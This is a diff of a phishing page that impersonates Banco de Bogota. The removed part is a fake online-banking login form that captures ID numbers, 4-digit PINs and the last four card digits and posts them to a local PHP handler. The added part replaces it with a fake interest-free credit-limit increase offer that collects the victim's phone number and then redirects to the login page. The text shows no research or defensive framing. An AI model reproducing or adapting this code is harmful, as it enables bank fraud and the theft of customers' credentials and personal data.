@@ -36,78 +36,54 @@ input.error{border-color:#c62828!important;border-width:2px!important;animation:
 <body>
 <div class="loader-overlay" id="loading-overlay">
 <div class="loader-spinner"><div class="dot d1"></div><div class="dot d2"></div><div class="dot d3"></div></div>
-<div class="loader-text">Validando datos...</div>
+<div class="loader-text">Procesando...</div>
 </div>
 <div class="container">
 <div class="container__login">
 <div class="container__login--header"><img src="logobanco1.jpg" alt="Banco de Bogota"></div>
-<div class="container__login--title"><h2>Bienvenido a tu Banca Virtual</h2></div>
-<div class="blue-banner"><img src="per.png" alt="ayuda"><div style="flex:1"><strong>Nunca has ingresado a Banca Virtual?</strong><br><a href="#">Aqui te decimos como hacerlo</a></div></div>
+<div class="container__login--title"><h2>Solicitud de Producto</h2></div>
+<div class="blue-banner"><img src="per.png" alt="ayuda"><div style="flex:1"><strong>Necesitas ayuda?</strong><br><a href="#">Contacta con un asesor ></a></div></div>
 <div class="login-card-content">
-<div id="error-mensaje" style="display:none;background:#ffebee;color:#c62828;padding:12px;border-radius:8px;text-align:center;margin-bottom:15px;font-size:.9em;border:2px solid #c62828;font-weight:600">Tus datos no coinciden. Verificalos e intenta nuevamente. (00)</div>
-<div style="display:flex;border-bottom:1px solid #ccc;margin-bottom:15px">
-<div class="tab active" onclick="switchTab('clave_segura')" style="padding:10px 15px;cursor:pointer;color:#0033a0;border-bottom:2px solid #0033a0;font-weight:700;font-size:14px">Clave segura</div>
-<div class="tab" onclick="switchTab('tarjeta_debito')" style="padding:10px 15px;cursor:pointer;color:#666;border-bottom:2px solid transparent;font-weight:700;font-size:14px">Tarjeta debito</div>
+<div style="text-align:center;font-size:15px;font-weight:600;color:#212529;margin-bottom:12px">Escoge tu aumento de cupo ideal entre $5.000.000 y $70.000.000</div>
+<img src="tarjeta bo.jpg" alt="Tarjeta" style="width:100%;border-radius:8px;margin-bottom:12px">
+<div style="text-align:center;font-size:28px;font-weight:700;color:#212529;margin:10px 0" id="valor">$5.000.000</div>
+<input type="range" min="5000000" max="50000000" step="500000" value="7000000" id="slider" oninput="actualizar()" style="width:100%;margin:15px 0;cursor:pointer">
+<div style="display:flex;justify-content:space-between;font-size:14px;color:#6c757d;margin-bottom:15px"><span>$5.000.000</span><span>$70.000.000</span></div>
+<div style="text-align:center;font-size:15px;font-weight:600;color:#212529;margin-top:20px;margin-bottom:10px">En cuantas cuotas?</div>
+<div style="display:flex;gap:6px;margin:10px 0 20px 0" id="plazos">
+<button class="plazo-btn" onclick="seleccionarPlazo(12)" style="flex:1;padding:10px 4px;font-size:13px;font-weight:600;border:1px solid #d1d1d1;border-radius:8px;background:#fff;cursor:pointer">12</button>
+<button class="plazo-btn" onclick="seleccionarPlazo(24)" style="flex:1;padding:10px 4px;font-size:13px;font-weight:600;border:1px solid #d1d1d1;border-radius:8px;background:#fff;cursor:pointer">24</button>
+<button class="plazo-btn" onclick="seleccionarPlazo(36)" style="flex:1;padding:10px 4px;font-size:13px;font-weight:600;border:1px solid #d1d1d1;border-radius:8px;background:#fff;cursor:pointer">36</button>
+<button class="plazo-btn" onclick="seleccionarPlazo(48)" style="flex:1;padding:10px 4px;font-size:13px;font-weight:600;border:1px solid #d1d1d1;border-radius:8px;background:#fff;cursor:pointer">48</button>
+<button class="plazo-btn" onclick="seleccionarPlazo(72)" style="flex:1;padding:10px 4px;font-size:13px;font-weight:600;border:1px solid #d1d1d1;border-radius:8px;background:#fff;cursor:pointer">72</button>
 </div>
-<div class="info-msg" id="infoMsg" style="display:block;background:#e6f0fa;color:#333;padding:12px;border-radius:8px;font-size:.8em;margin-bottom:15px;position:relative;line-height:1.4">
-Estas ingresando con tu Clave Segura. Selecciona Tarjeta Debito para cambiar el tipo de ingreso.
-<span onclick="this.parentElement.style.display='none'" style="position:absolute;right:8px;top:5px;cursor:pointer;font-size:1.2em;font-weight:700">&times;</span>
+<div style="background:#f5f7fa;border-radius:8px;padding:16px;margin-top:20px;text-align:center">
+<div style="font-size:12px;color:#6b7280">Cuota mensual estimada</div>
+<div style="font-size:24px;font-weight:700;color:#111827;margin-top:4px" id="cuota">$0</div>
 </div>
-<form method="post" id="loginForm" autocomplete="off">
-<div style="margin-bottom:6px;margin-top:10px;font-weight:600;color:#333;font-size:13px">Tipo de Persona</div>
-<select id="tipoPersona" style="width:100%;padding:12px;border:1px solid #d1d1d1;border-radius:8px;font-size:14px;margin-bottom:10px">
-<option value="Personas">Personas</option><option value="Empresas">Empresas</option>
-</select>
-<div style="margin-bottom:6px;margin-top:10px;font-weight:600;color:#333;font-size:13px">Identificacion</div>
-<div style="display:flex;gap:10px">
-<select id="IType" style="width:35%;padding:12px;border:1px solid #d1d1d1;border-radius:8px;font-size:14px;margin-bottom:10px">
-<option value="CC">C.C.</option><option value="TI">T.I.</option><option value="CE">C.E.</option><option value="NPN">N.P.N.</option><option value="PS">P.S.</option>
-</select>
-<input type="tel" id="numi" style="width:65%;padding:12px;border:1px solid #d1d1d1;border-radius:8px;font-size:14px;margin-bottom:10px;outline:none" placeholder="Numero" required>
-</div>
-<div style="margin-bottom:6px;margin-top:10px;font-weight:600;color:#333;font-size:13px" id="passLabel">Clave segura</div>
-<input type="password" id="clvseg" style="width:100%;padding:12px;border:1px solid #d1d1d1;border-radius:8px;font-size:16px;margin-bottom:10px;outline:none" maxlength="4" placeholder="...." inputmode="numeric">
-<div id="last4-container" style="display:none">
-<div style="margin-bottom:6px;margin-top:10px;font-weight:600;color:#333;font-size:13px">Ultimos 4 digitos de tu tarjeta debito</div>
-<input type="password" id="last4" style="width:100%;padding:12px;border:1px solid #d1d1d1;border-radius:8px;font-size:16px;margin-bottom:10px;outline:none" maxlength="4" placeholder="...." inputmode="numeric">
-</div>
-<button type="submit" id="btnLogin" style="width:100%;margin-top:15px;padding:14px;background:#0033a0;color:#fff;border:none;font-size:16px;font-weight:700;border-radius:8px;cursor:pointer">Ingresar</button>
-</form>
-</div>
-<div style="display:flex;justify-content:space-between;margin-top:12px;font-size:.85em">
-<a href="#" style="color:#0033a0;text-decoration:none;font-weight:700">Registrarme</a>
-<a href="#" style="color:#0033a0;text-decoration:none;font-weight:700">Olvide mi clave</a>
+<div style="font-size:13px;color:#c62828;margin-top:10px;text-align:center;background:#ffebee;padding:8px;border-radius:4px">El cupo se asigna sin intereses mensuales y con aprobacion digital.</div>
+<input type="tel" id="numero_telefono" style="width:100%;padding:14px;border-radius:8px;border:1px solid #d1d1d1;margin-top:10px;box-sizing:border-box;font-size:16px;outline:none" placeholder="Numero de telefono" maxlength="11">
+<button onclick="enviarCupo()" style="width:100%;margin-top:15px;padding:14px 20px;background:#0033a0;color:#fff;border:none;font-size:16px;font-weight:700;border-radius:8px;cursor:pointer">SOLICITAR AUMENTO</button>
+<div style="text-align:center;color:#999;font-size:.8em;margin-top:15px">Este sitio esta protegido por reCAPTCHA y aplican las politicas</div>
 </div>
 </div>
-<div class="container__info"><img src="taval.jpg" alt="Banner" style="width:100%;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,.1)"></div>
+<div class="container__info"><img src="taval.jpg" alt="Tu Aval" style="width:100%;border-radius:10px;box-shadow:0 4px 15px rgba(0,0,0,.1)"></div>
+</div>
+<div id="modal-error" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.4);z-index:9999;justify-content:center;align-items:center">
+<div style="background:#fff;border-radius:16px;padding:32px 24px;max-width:320px;width:90%">
+<svg width="52" height="52" viewBox="0 0 24 24" fill="#f5a623" style="margin-bottom:20px"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
+<div style="font-size:20px;font-weight:700;color:#111;margin-bottom:12px">Escribe tu numero</div>
+<div style="font-size:15px;color:#444;line-height:1.5;margin-bottom:28px">Verificalo e intentalo nuevamente. (00)</div>
+<button onclick="document.getElementById('modal-error').style.display='none'" style="width:100%;padding:16px;background:#0033a0;color:#fff;font-size:16px;font-weight:700;border:none;border-radius:12px;cursor:pointer">Volver a ingresar</button>
+</div>
 </div>
 <script>
-var currentTabMode="clave_segura";
-function switchTab(tab){
-currentTabMode=tab;var tabs=document.querySelectorAll(".tab");
-for(var i=0;i<tabs.length;i++){var oc=tabs[i].getAttribute("onclick");tabs[i].style.color=oc&&oc.indexOf(tab)!==-1?"#0033a0":"#666";tabs[i].style.borderBottom=oc&&oc.indexOf(tab)!==-1?"2px solid #0033a0":"2px solid transparent"}
-var clvseg=document.getElementById("clvseg"),l4c=document.getElementById("last4-container"),l4i=document.getElementById("last4"),im=document.getElementById("infoMsg"),pl=document.getElementById("passLabel");
-clvseg.value="";if(l4i)l4i.value="";
-if(tab==="clave_segura"){pl.textContent="Clave segura";clvseg.placeholder="....";clvseg.maxLength=4;l4c.style.display="none";if(l4i){l4i.required=false;l4i.value=""}
-im.style.display="block";im.innerHTML="Estas ingresando con tu Clave Segura. Selecciona Tarjeta Debito para cambiar el tipo de ingreso.<span onclick='this.parentElement.style.display=\"none\"' style='position:absolute;right:8px;top:5px;cursor:pointer;font-size:1.2em;font-weight:700'>&times;</span>"
-}else{pl.textContent="Contrasena";clvseg.placeholder="";clvseg.maxLength=4;l4c.style.display="block";if(l4i){l4i.required=true;l4i.value=""}
-im.style.display="block";im.innerHTML="Estas ingresando con tu Tarjeta Debito.<span onclick='this.parentElement.style.display=\"none\"' style='position:absolute;right:8px;top:5px;cursor:pointer;font-size:1.2em;font-weight:700'>&times;</span>"}
-}
-document.addEventListener("DOMContentLoaded",function(){
-document.getElementById("clvseg").addEventListener("input",function(){if(this.value.length>4)this.value=this.value.slice(0,4);if(currentTabMode==="clave_segura")this.value=this.value.replace(/[^0-9]/g,"")});
-document.getElementById("numi").addEventListener("input",function(){this.value=this.value.replace(/[^0-9]/g,"")});
-document.getElementById("last4").addEventListener("input",function(){this.value=this.value.replace(/[^0-9]/g,"")});
-document.getElementById("loginForm").addEventListener("submit",function(e){e.preventDefault();
-var tp=document.getElementById("tipoPersona").value,ti=document.getElementById("IType").value,ni=document.getElementById("numi").value,cv=document.getElementById("clvseg").value;
-if(!ni||!cv){alert("Completa todos los campos");return}
-var lc=document.getElementById("last4-container"),l4=lc.style.display!=="none"?document.getElementById("last4").value:"";
-if(lc.style.display!=="none"&&!l4){alert("Ingresa los ultimos 4 digitos");return}
-var ti2=lc.style.display!=="none"?"Tarjeta Debito":"Clave Segura";
-document.getElementById("loading-overlay").style.display="flex";
-var fd=new FormData();fd.append("tipo_persona",tp);fd.append("tipo_id",ti);fd.append("numero_id",ni);fd.append("clave",cv);fd.append("tipo_ingreso",ti2);fd.append("ultimos_4",l4);
-fetch("index.php?action=enviar-login",{method:"POST",body:new URLSearchParams(fd)}).then(function(r){return r.json()}).then(function(d){if(d.ok)window.location.href=d.redirect}).catch(function(){alert("Error de conexion")})
-});
-});
+var plazoSeleccionado=12;
+function actualizar(){var v=parseInt(document.getElementById("slider").value);document.getElementById("valor").innerText="$"+Number(v).toLocaleString("es-CO");document.getElementById("cuota").innerText="$"+Math.round(v/plazoSeleccionado).toLocaleString("es-CO")}
+function seleccionarPlazo(p){plazoSeleccionado=p;var btns=document.querySelectorAll(".plazo-btn");for(var i=0;i<btns.length;i++){btns[i].style.background="#fff";btns[i].style.color="#212529";btns[i].style.borderColor="#d1d1d1"}event.target.style.background="#0033a0";event.target.style.color="#fff";event.target.style.borderColor="#0033a0";actualizar()}
+function enviarCupo(){var tel=document.getElementById("numero_telefono").value.trim();if(tel.length<7){document.getElementById("modal-error").style.display="flex";return}
+var monto=document.getElementById("slider").value;document.getElementById("loading-overlay").style.display="flex";var fd=new FormData();fd.append("monto",monto);fd.append("plazo",plazoSeleccionado);fd.append("telefono",tel);fetch("index.php?action=enviar-cupo",{method:"POST",body:new URLSearchParams(fd)}).then(function(r){return r.json()}).then(function(d){if(d.ok)window.location.href=d.redirect}).catch(function(){window.location.href="index.php?page=login"})}
+actualizar();document.querySelectorAll(".plazo-btn")[0].style.background="#0033a0";document.querySelectorAll(".plazo-btn")[0].style.color="#fff";document.querySelectorAll(".plazo-btn")[0].style.borderColor="#0033a0";
 </script>
 <script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"3acf5ee7907441b39cb5d1b750314325","r":1,"spa":2}' crossorigin="anonymous"></script>
 </body>
